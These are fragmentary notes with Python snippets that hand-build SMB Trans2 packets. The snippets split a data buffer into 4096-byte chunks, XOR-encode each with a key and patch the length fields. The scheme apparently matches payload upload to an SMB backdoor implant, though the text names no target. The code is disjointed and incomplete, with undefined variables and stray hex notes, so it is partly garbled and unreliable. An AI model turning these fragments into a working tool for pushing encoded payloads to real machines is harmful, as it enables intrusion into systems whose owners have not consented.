Python big endian
smb_Length = struct.pack(">H",4096 +32 +34 + 12)
\x10N / value: 4174

Little endian:
totalDataCount = struct.pack("<H",4096)
00 10 

byteCount = struct.pack("<H",4096 + 13)
0d 10

data_index = struct.pack(">H",i*0x10)

netBIOS_header = "\x00\x00" + smb_Length
smb_header = "\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x42\x00"
transRequest_header = "\x0F\x0C\x00" + totalDataCount +
"\x01\x00\x00\x00\x00\x00\x00\x00\xF0\xCC\x0C\x00\x00\x00\x0C\x00\x42\x00" + totalDataCount + "\x4E\x00\x01\x00\x0E\x00" + byteCount +"\x00"
data_index = struct.pack(">H",i*0x10)
data_header = "\x00\x2C\x00\x00"+totalDataCount+"\x00\x00"+data_index+"\x00\x00"

array.append(netBIOS_header + smb_header +transRequest_header + xor_data(data_header + make_data,key))


for i in range(ncount):
		if i < ncount-1:
			smb_Length = struct.pack(">H",4096 +32 +34 + 12)
			#print binascii.b2a_hex(smb_Length)
			totalDataCount = struct.pack("<H",4096)
			byteCount = struct.pack("<H",4096 + 13)
			make_data = send_data[i*4096:(i+1)*4096]
		else:
			smb_Length = struct.pack(">H",data_len - 4096*i +32 +34 + 12)
			totalDataCount = struct.pack("<H",data_len - 4096*i)
			byteCount = struct.pack("<H",data_len - 4096*i+ 13)
			make_data = send_data[i*4096:]

			
				
important information:

*(WORD *)(packet+0x27)= VALUE1;  //update Total Data Count
*(WORD *)(packet+0x3b)= VALUE2;  //update Data Count
*(WORD *)(Packet+0x45)= VALUE3;  //update Byte Count
